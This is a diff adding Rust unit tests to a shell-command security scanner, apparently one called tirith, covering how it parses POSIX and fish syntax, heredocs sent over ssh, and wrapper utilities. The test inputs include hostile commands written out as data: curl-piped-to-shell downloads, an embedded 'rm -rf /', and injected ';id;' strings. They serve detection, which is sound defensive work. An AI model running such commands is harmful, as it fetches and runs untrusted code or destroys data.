+            ("export TMP\"DIR\"=x", ShellType::Posix),
+            ("declare -x X", ShellType::Posix),
+            ("read X", ShellType::Posix),
+            ("printf -v X %s y", ShellType::Posix),
+            ("set -a", ShellType::Posix),
+            ("set -o allexport", ShellType::Posix),
+            (": ${X:=y}", ShellType::Posix),
+            ("a[1]=x", ShellType::Posix),
+            ("set -l x 1", ShellType::Fish),
+            // A loop or coprocess name binds that variable.
+            ("for TMPDIR in \"/tmp/;id;\"; do :; done", ShellType::Posix),
+            ("for HOME; do :; done", ShellType::Posix),
+            ("select TMPDIR in a b; do break; done", ShellType::Posix),
+            ("coproc TMPDIR { :; }", ShellType::Posix),
+            ("foreach TMPDIR (/tmp/x) :; end", ShellType::Posix),
+            ("for TMPDIR (/tmp/x) :", ShellType::Posix),
+            ("for TMPDIR in /tmp/x; :; end", ShellType::Fish),
+        ] {
+            assert!(input_may_set_variables(raw, shell), "{raw}");
+        }
+        for (raw, shell) in [
+            ("set -euo pipefail", ShellType::Posix),
+            ("echo --opt=value", ShellType::Posix),
+            ("ls /usr/local/bin", ShellType::Posix),
+            ("set_color red", ShellType::Fish),
+            ("readlink -f x", ShellType::Posix),
+            ("forge build", ShellType::Posix),
+            ("git log --format=oneline", ShellType::Posix),
+            ("echo transform", ShellType::Posix),
+        ] {
+            assert!(!input_may_set_variables(raw, shell), "{raw}");
+        }
+        // The emitter's own operand is left out.
+        assert_eq!(
+            ShellStateChange::of_input(r#"eval "$(fnm env --use-on-cd)""#, ShellType::Posix),
+            ShellStateChange::default()
+        );
+    }
+
+    #[test]
+    fn fpperf_2_brace_groups_with_trailing_redirections_are_complete() {
+        for (input, body) in [
+            ("{ echo a; echo b; } > out.txt", " echo a; echo b; "),
+            (
+                "{ cargo build; cargo test; } 2>&1 | tee build.log",
+                " cargo build; cargo test; ",
+            ),
+            (
+                "{ echo '## Notes'; cat notes.md; } >> README.md",
+                " echo '## Notes'; cat notes.md; ",
+            ),
+            ("{ echo a; } >out 2>err </dev/null", " echo a; "),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input}: {scan:?}");
+            assert!(
+                scan.bodies.iter().any(|candidate| candidate.input == body),
+                "{input}: {scan:?}"
+            );
+        }
+        for input in ["{ echo a; } extra", "{ echo a; } always { echo b; }"] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input}: {scan:?}"
+            );
+        }
+        // Substitutions in the redirection target are still recovered.
+        let scan = executable_substitution_scan("{ echo a; } > \"$(rm -rf /)\"", ShellType::Posix);
+        assert!(
+            scan.bodies.iter().any(|body| body.input == "rm -rf /"),
+            "{scan:?}"
+        );
+    }
+
+    #[test]
+    fn fpperf_2_literal_array_element_assignments() {
+        for input in [
+            "typeset -A map; map[a]=1",
+            "declare -A map\nmap[key.name]=\"x y\"",
+            "typeset -gA map; map[a]+=1; map[b]=2",
+            "arr[0]=x",
+            "arr[12]+=y",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input}: {scan:?}");
+        }
+        for input in [
+            // An indexed subscript is arithmetic: a name or expansion in it
+            // is evaluated, recursively.
+            "map[a]=1",
+            "arr[i]=1",
+            "if true; then typeset -A map; fi; map[a]=1",
+            "false && typeset -A map; map[a]=1",
+            "typeset -A map; unset map; map[a]=1",
+            "typeset -A map; echo hi; map[a]=1",
+            "typeset -A map; map[$k]=1",
+            "typeset -A map; map[a]=1 cmd",
+            "typeset -A $NAME; map[a]=1",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input}: {scan:?}"
+            );
+        }
+    }
+
+    #[test]
     fn powershell_here_strings_preserve_literal_data_and_recover_expansions() {
         let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (open, close) in [
@@ -20479,6 +24013,120 @@ mod tests {
         assert!(executable_substitutions(input, ShellType::Cmd).is_empty());
         assert!(tirith_inert_arg_range(input, ShellType::Cmd).is_some());
         assert!(extract_urls(input, ShellType::Cmd).is_empty());
+    }
+
+    #[test]
+    fn posix_parameter_expansions_close_on_their_own_brace() {
+        // A `${...}` expansion ends at its first unquoted `}`, unlike a brace
+        // group's reserved-word `}`, and `#` inside it is not a comment.
+        for (definition, body) in [
+            (r#"f() { echo "${v}"; }"#, r#" echo "${v}"; "#),
+            (
+                r#"install() { tar -xzf "tool-${version}.tar.gz"; }"#,
+                r#" tar -xzf "tool-${version}.tar.gz"; "#,
+            ),
+            ("f() { echo ${v}; }", " echo ${v}; "),
+            (
+                r#"f() { echo "${v:-default}" "${#arr[@]}" ${v#prefix} ${#}; }"#,
+                r#" echo "${v:-default}" "${#arr[@]}" ${v#prefix} ${#}; "#,
+            ),
+            (r#"f() { echo "${v:- #x}"; }"#, r#" echo "${v:- #x}"; "#),
+            (
+                "f() {\n  echo \"tool-${version}.tar.gz\"\n}",
+                "\n  echo \"tool-${version}.tar.gz\"\n",
+            ),
+            (r#"function f { echo "${v}"; }"#, r#" echo "${v}"; "#),
+            (r#"function f() { echo "${v}"; }"#, r#" echo "${v}"; "#),
+            (r#"f() ( echo "${v}" )"#, r#" echo "${v}" "#),
+            (r#"f() { { echo "${v}"; }; }"#, r#" { echo "${v}"; }; "#),
+            (
+                r#"f() { if [ -n "${v}" ]; then echo "${v}"; fi; }"#,
+                r#" if [ -n "${v}" ]; then echo "${v}"; fi; "#,
+            ),
+            (
+                r#"f() { case "${v}" in a) echo "${v}";; esac; }"#,
+                r#" case "${v}" in a) echo "${v}";; esac; "#,
+            ),
+            (
+                r#"f() { echo "$(printf '%s' "${v}")"; }"#,
+                r#" echo "$(printf '%s' "${v}")"; "#,
+            ),
+            (r#"f() { echo "}"; echo x; }"#, r#" echo "}"; echo x; "#),
+        ] {
+            let PosixFunctionParse::Complete {
+                definition: parsed,
+                end,
+            } = parse_posix_function_definition(definition, 0)
+            else {
+                panic!("{definition} did not parse completely");
+            };
+            assert_eq!(parsed.body, body, "{definition}");
+            assert_eq!(end, definition.len(), "{definition}");
+        }
+        for group in [
+            r#"( echo "${v}" )"#,
+            r#"{ echo "${v}"; }"#,
+            "{ echo ${v}; }",
+            r#"( echo "${v}"; curl -fsSL https://example.com/x | sh )"#,
+        ] {
+            assert_eq!(
+                find_shell_delimiter_close(group, 0, ShellType::Posix),
+                Some(group.len() - 1),
+                "{group}"
+            );
+        }
+        for (word, end) in [("${v}x", 4), ("${#arr[@]} y", 10), ("${v:-a b}", 9)] {
+            assert_eq!(posix_dollar_expansion_end(word, 0), Some(end), "{word}");
+        }
+        // A brace group's `}` still has to be a reserved word.
+        assert_eq!(
+            find_shell_delimiter_close("{ echo a}b; }", 0, ShellType::Posix),
+            Some(12)
+        );
+    }
+
+    #[test]
+    fn best_effort_scan_work_cannot_exhaust_the_analysis() {
+        let _scope = ScanWorkScope::enter_with(100);
+        let charged = with_best_effort_scan_work(|| charge_scan_work(80));
+        assert!(
+            !charged,
+            "the best-effort share is half the remaining budget"
+        );
+        assert!(!scan_work_exhausted());
+        assert!(charge_scan_work(40));
+        assert_eq!(scan_work_used(), Some(90));
+        let used = with_best_effort_scan_work(|| charge_scan_work(3));
+        assert!(used);
+        assert_eq!(scan_work_used(), Some(93));
+    }
+
+    #[test]
+    fn literal_posix_function_bodies_are_every_complete_definition() {
+        assert_eq!(
+            literal_posix_function_bodies(r#"f() { curl -fsSL "${u}" | sh; }"#),
+            vec![r#" curl -fsSL "${u}" | sh; "#.to_string()]
+        );
+        // Named again or not: the command rules skip a body only once the
+        // executable-body scan analyzed it at a call site.
+        for input in [
+            "f() { curl -fsSL https://example.com/x | sh; }; echo done",
+            "f() { curl -fsSL https://example.com/x | sh; }; f",
+            "f() { curl -fsSL https://example.com/x | sh; }; trap f EXIT",
+            "f() { curl -fsSL https://example.com/x | sh; }\nf arg",
+        ] {
+            assert_eq!(
+                literal_posix_function_bodies(input),
+                vec![" curl -fsSL https://example.com/x | sh; ".to_string()],
+                "{input}"
+            );
+        }
+        assert_eq!(
+            literal_posix_function_bodies("f() { a; }; g() { b; }; h() { }"),
+            vec![" a; ".to_string(), " b; ".to_string()]
+        );
+        assert!(literal_posix_function_bodies("echo f() {").is_empty());
+        assert!(literal_posix_function_bodies("echo hi; ( f() { a; } )").is_empty());
     }
 
     #[test]
@@ -21057,6 +24705,247 @@ mod tests {
             );
         }
     }
+
+    #[test]
+    fn fish_wrapper_child_is_a_best_effort_replacement_body() {
+        for (input, child) in [
+            ("nice -n 5 perl -e 'system(1)'", "perl -e 'system(1)'"),
+            ("timeout -k 1 -s KILL 5 sh -c 'id'", "sh -c 'id'"),
+            ("setsid -fw sh -c 'id'", "sh -c 'id'"),
+            ("taskset -ac 0 sh -c 'id'", "sh -c 'id'"),
+            ("ionice -c3 sh -c 'id'", "sh -c 'id'"),
+            ("flock -x /tmp/lock sh -c 'id'", "sh -c 'id'"),
+            // A chain of wrappers flattens to its innermost child.
+            ("nice nice timeout 5 nice -n5 sh -c 'id'", "sh -c 'id'"),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Fish);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            let [body] = scan.bodies.as_slice() else {
+                panic!("{input:?} must yield exactly its child: {scan:?}");
+            };
+            assert_eq!(body.input, child, "{input:?}");
+            assert_eq!(body.shell, ShellType::Fish);
+            assert!(body.best_effort, "{input:?} child must be best-effort");
+            assert_eq!(
+                body.origin.as_ref().map(|origin| origin.relation),
+                Some(ExecutableRelation::WrapperReplacement),
+                "{input:?}"
+            );
+        }
+        // POSIX keeps required (non-best-effort) delegation children.
+        let scan = executable_substitution_scan("nice -n5 sh -c 'id'", ShellType::Posix);
+        assert!(scan.gap.is_none(), "{scan:?}");
+        assert!(scan.bodies.iter().all(|body| !body.best_effort), "{scan:?}");
+    }
+
+    /// fish reads `\'` and `\\` as escapes inside single quotes (CORE-7).
+    #[test]
+    fn fish_single_quote_escapes_do_not_end_the_quote() {
+        let substitutions = |raw: &str| {
+            let (bodies, gap) = lexical_executable_substitutions(raw, ShellType::Fish);
+            (
+                bodies
+                    .into_iter()
+                    .map(|body| body.input)
+                    .collect::<Vec<_>>(),
+                gap,
+            )
+        };
+        for raw in [
+            r"echo 'it\'s'",
+            r"git commit -m 'it\'s done'",
+            r"echo 'x\'y\'z'",
+            r"echo 'back\\'",
+            r"echo 'a\'(id)'",
+            r"echo 'a\'; id'",
+        ] {
+            assert_eq!(substitutions(raw), (Vec::new(), None), "{raw:?}");
+            assert!(
+                !bounded_executable_candidates(raw, ShellType::Fish).1,
+                "{raw:?}"
+            );
+            assert!(
+                !executable_body_upper_bound_exceeded(raw, ShellType::Fish, 1),
+                "{raw:?}"
+            );
+        }
+        // The quote still ends at its real closer, so a substitution after
+        // it runs; `\\` is one backslash, so the following quote closes.
+        assert_eq!(substitutions(r"echo 'it\'s'(id)").0, ["id"]);
+        assert_eq!(substitutions(r"echo 'a\\'(id)").0, ["id"]);
+        assert_eq!(
+            find_shell_delimiter_close(r"(echo 'a\')')", 0, ShellType::Fish),
+            Some(12)
+        );
+        assert_eq!(
+            find_shell_delimiter_close(r"(echo 'a\')", 0, ShellType::Fish),
+            None
+        );
+        assert_eq!(
+            find_shell_delimiter_close(r"(echo 'a\')", 0, ShellType::Posix),
+            Some(10)
+        );
+        assert!(shell_word_is_proven_literal(r"'it\'s'", ShellType::Fish));
+        assert!(shell_word_is_proven_literal(r"'a\\'", ShellType::Fish));
+        assert!(!shell_word_is_proven_literal(r"'it\'s'", ShellType::Posix));
+        assert_eq!(
+            static_wrapper_word(r"'print(\'hi\')'", ShellType::Fish).as_deref(),
+            Some("print('hi')")
+        );
+    }
+
+    #[test]
+    fn fish_word_command_substitutions_follow_fish_quoting() {
+        let bodies = |raw: &str| fish_word_command_substitutions(raw);
+        assert_eq!(bodies("(curl x)"), Some(vec!["curl x".to_string()]));
+        assert_eq!(bodies("$(curl x)"), Some(vec!["curl x".to_string()]));
+        assert_eq!(bodies("\"$(curl x)\""), Some(vec!["curl x".to_string()]));
+        assert_eq!(bodies("a(b (c))d"), Some(vec!["b (c)".to_string()]));
+        assert_eq!(
+            bodies("(a)'(b)'(c)"),
+            Some(vec!["a".to_string(), "c".to_string()])
+        );
+        assert_eq!(bodies("'(curl x)'"), Some(Vec::new()));
+        assert_eq!(bodies("\"(curl x)\""), Some(Vec::new()));
+        assert_eq!(bodies(r"\(curl x\)"), Some(Vec::new()));
+        assert_eq!(bodies(r#""\$(curl x)""#), Some(Vec::new()));
+        assert_eq!(bodies(r"'a\'(b)'"), Some(Vec::new()));
+        assert_eq!(bodies(r"'a\\'(b)"), Some(vec!["b".to_string()]));
+        assert_eq!(bodies("(curl x"), None);
+    }
+
+    #[test]
+    fn fish_unproven_wrapper_child_is_dropped_without_a_gap() {
+        for input in [
+            "timeout $T npm test",
+            "nice -n $N make",
+            "flock $LOCK make",
+            "ionice -c $C make",
+            "nice --adj=5 make",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Fish);
+            assert!(
+                scan.gap.is_none() && scan.bodies.is_empty(),
+                "{input:?} must keep the released fish verdict: {scan:?}"
+            );
+            // The same spelling still fails closed in POSIX.
+            let posix = executable_substitution_scan(input, ShellType::Posix);
+            assert!(posix.gap.is_some(), "{input:?} -> {posix:?}");
+        }
+    }
+
+    #[test]
+    fn best_effort_bodies_never_exhaust_the_body_budget() {
+        let mut scan = ExecutableSubstitutionScan::default();
+        for index in 0..MAX_EXECUTABLE_SCAN_BODIES {
+            let mut best_effort =
+                ExecutableBody::without_origin(format!("id {index}"), ShellType::Fish);
+            best_effort.best_effort = true;
+            scan.bodies.push(best_effort);
+        }
+        scan.bodies.push(ExecutableBody::without_origin(
+            "id required".to_string(),
+            ShellType::Fish,
+        ));
+        assert!(
+            !bound_executable_bodies(&mut scan),
+            "a best-effort body must not crowd out or report a required one"
+        );
+        assert!(scan
+            .bodies
+            .iter()
+            .any(|body| !body.best_effort && body.input == "id required"));
+        assert_eq!(scan.bodies.len(), MAX_EXECUTABLE_SCAN_BODIES);
+    }
+
+    #[test]
+    fn delegation_utility_option_grammar_finds_the_child() {
+        for (input, child) in [
+            ("nice -n5 make", Some("make")),
+            ("nice -5 make", Some("make")),
+            ("nice --5 make", Some("make")),
+            ("nice -+5 make", Some("make")),
+            ("nice --adjustment=5 make", Some("make")),
+            ("nice --adjustment 5 make", Some("make")),
+            ("nice -n -5 make", Some("make")),
+            ("nice --help", None),
+            ("timeout -k1 5 make", Some("make")),
+            ("timeout -sKILL 5 make", Some("make")),
+            ("timeout -vk 1 5 make", Some("make")),
+            ("timeout -vsKILL 5 make", Some("make")),
+            ("timeout --signal=KILL --kill-after 1 5s make", Some("make")),
+            ("timeout -f -p 5 make", Some("make")),
+            ("setsid -fw make", Some("make")),
+            ("setsid -cfw make", Some("make")),
+            ("setsid -fV make", None),
+            ("taskset -ac 0 make", Some("make")),
+            ("taskset --cpu-list 0-3 make", Some("make")),
+            ("taskset -pc 0 1234", None),
+            ("taskset -p 1234", None),
+            ("ionice -c3 make", Some("make")),
+            ("ionice -c 2 -n 7 make", Some("make")),
+            ("ionice -tc3 make", Some("make")),
+            ("ionice --class=idle make", Some("make")),
+            ("ionice -p 1234", None),
+            ("ionice -c3 -p 1234 5678", None),
+            ("ionice -P 99", None),
+            ("ionice --uid 1000", None),
+            ("ionice", None),
+            ("flock /tmp/lock make", Some("make")),
+            ("flock -xn -w 10 /tmp/lock make", Some("make")),
+            ("flock --timeout=10 -E 3 /tmp/lock make", Some("make")),
+            ("flock ~/.cache/build.lock make", Some("make")),
+            ("flock \"/run/$USER.lock\" make", Some("make")),
+            ("flock /tmp/lock -c 'make install'", Some("make install")),
+            (
+                "flock /tmp/lock --command 'make install'",
+                Some("make install"),
+            ),
+            ("flock /tmp/lock -c", None),
+            ("flock /tmp/lock -c 'make' extra", None),
+            ("flock 9", None),
+            ("flock -u 9", None),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            let bodies = scan
+                .bodies
+                .iter()
+                .map(|body| body.input.as_str())
+                .collect::<Vec<_>>();
+            match child {
+                Some(child) => assert_eq!(bodies, vec![child], "{input:?}"),
+                None => assert!(bodies.is_empty(), "{input:?} has no child: {bodies:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn delegation_utility_ambiguous_options_fail_closed() {
+        for input in [
+            "nice --adj=5 make",
+            "nice -x make",
+            "nice -n",
+            "timeout --sig=KILL 5 make",
+            "timeout -s $SIG 5 make",
+            "timeout --signal= 5 make",
+            "setsid --fork=1 make",
+            "taskset -Z 0 make",
+            "ionice -X make",
+            "ionice -c $C make",
+            "ionice $OPTS make",
+            "flock $LOCK make",
+            "flock \"$LOCK\" make",
+            "flock \"$@\" make",
+            "flock /tmp/*.lock make",
+            "flock -w $T /tmp/lock make",
+            "flock -c make /tmp/lock",
+            "flock /tmp/lock -c \"$CMD\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_some(), "{input:?} must fail closed: {scan:?}");
+        }
+    }
 }
 
 #[cfg(test)]
@@ -21272,5 +25161,163 @@ mod curl_glob_tests {
             curl_host_glob(&reference(&"n".repeat(128)), true),
             CurlHostGlob::Unreadable
         );
+    }
+}
+
+#[cfg(test)]
+mod stream_device_tests {
+    use super::*;
+
+    #[test]
+    fn standard_stream_spellings() {
+        for path in [
+            "/dev/stdout",
+            "/dev//stdout",
+            "/dev/./stdout",
+            "/tmp/../dev/stdout",
+            "/dev/fd/1",
+            "/dev/fd/01",
+            "/proc/self/fd/1",
+            "/proc/thread-self/fd/001",
+        ] {
+            assert!(names_standard_stream(path, 1), "{path}");
+        }
+        for path in [
+            "/dev/stdin",
+            "/dev/fd/0",
+            "/dev/fd/00",
+            "/proc/self/fd/0",
+            "-",
+        ] {
+            assert!(posix_stdin_code_path(path), "{path}");
+        }
+        for path in [
+            "dev/stdout",
+            "/dev/stdout2",
+            "/dev/fd/10",
+            "/dev/fd/x",
+            "/tmp/stdout",
+        ] {
+            assert!(!names_standard_stream(path, 1), "{path}");
+        }
+        assert_eq!(
+            standard_stream_device("/dev/fd/12"),
+            Some(StreamDevice::Numbered(12))
+        );
+        assert_eq!(
+            standard_stream_device("/dev/stderr"),
+            Some(StreamDevice::Named(2))
+        );
+    }
+}
+
+#[cfg(test)]
+mod remote_heredoc_reader_tests {
+    use super::*;
+
+    fn heredoc_bodies(input: &str) -> Vec<(String, bool)> {
+        executable_substitution_scan(input, ShellType::Posix)
+            .bodies
+            .into_iter()
+            .map(|body| (body.input, body.best_effort))
+            .collect()
+    }
+
+    /// ssh hands its standard input to the remote command: a shell that reads
+    /// its script from stdin, or the login shell when there is no command.
+    /// The body is read best-effort.
+    #[test]
+    fn heredocs_fed_to_a_remote_shell_are_best_effort_code() {
+        for input in [
+            "ssh host sh <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host bash -s <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -p 2222 -o BatchMode=yes deploy@host <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host -t sudo sh <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host 'bash -s' -- arg <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+        ] {
+            let bodies = heredoc_bodies(input);
+            assert!(
+                bodies
+                    .iter()
+                    .any(|(body, best_effort)| body.contains("curl") && *best_effort),
+                "{input}: {bodies:?}"
+            );
+        }
+        for input in [
+            "ssh host 'cat > notes.txt' <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host tee /tmp/notes <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -n host sh <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -N host <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -s host sftp <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host \"$CMD\" <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host sh 3<<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+        ] {
+            let bodies = heredoc_bodies(input);
+            assert!(
+                !bodies.iter().any(|(body, _)| body.contains("curl")),
+                "{input}: {bodies:?}"
+            );
+        }
+    }
+
+    /// dash and zsh run an assignment-only command's substitutions with the
+    /// heredoc on standard input.
+    #[test]
+    fn heredocs_on_assignment_substitutions_are_code_when_a_shell_reads_them() {
+        let bodies =
+            heredoc_bodies("x=$(sh) <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF");
+        assert!(
+            bodies
+                .iter()
+                .any(|(body, best_effort)| body.contains("curl") && !*best_effort),
+            "{bodies:?}"
+        );
+        for input in [
+            "x=$(cat) <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "x=1 <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+        ] {
+            let bodies = heredoc_bodies(input);
+            assert!(
+                !bodies.iter().any(|(body, _)| body.contains("curl")),
+                "{input}: {bodies:?}"
+            );
+        }
+    }
+
+    /// A local shell reading wins over a remote one when both read a body.
+    #[test]
+    fn heredoc_reading_or_prefers_local_shells() {
+        let local = HeredocReading::shell(ShellType::Posix);
+        let remote = HeredocReading::remote_shell(ShellType::Posix);
+        assert!(!remote.or(local).best_effort);
+        assert!(!local.or(remote).best_effort);
+        assert!(remote.or(HeredocReading::DATA).best_effort);
+        assert!(!HeredocReading::DATA.or(HeredocReading::DATA).best_effort);
+    }
+}
+
+#[cfg(test)]
+mod url_extraction_scale_tests {
+    use super::*;
+
+    /// A word holding thousands of URLs extracts in linear time and keeps the
+    /// same URLs as a small one.
+    #[test]
+    fn many_urls_in_one_substitution_extract_quickly() {
+        let urls = (0..3000)
+            .map(|index| format!("https://e{index}.example.com/p"))
+            .collect::<Vec<_>>()
+            .join(" ");
+        let input = format!("python3 -c \"$(echo {urls})\"");
+        let started = std::time::Instant::now();
+        let extracted = extract_urls(&input, ShellType::Posix);
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(20),
+            "took {:?}",
+            started.elapsed()
+        );
+        assert!(extracted
+            .iter()
+            .any(|url| url.raw == "https://e2999.example.com/p"));
     }
 }
